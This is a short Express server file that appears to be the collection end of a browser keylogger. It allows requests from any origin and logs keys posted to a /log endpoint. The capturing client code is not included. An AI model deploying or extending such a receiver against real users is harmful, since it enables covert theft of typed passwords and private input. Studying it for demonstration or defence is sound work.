import express from "express";
import cors from "cors";
// Initialization
const app = express();

// Middleware
app.use(express.json());
app.use(cors());

// logging endpoint
app.post("/log", (req, res) => {
  console.log("Keystroke logged:", req.body.key);
  res.send();
});

const PORT = 2000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
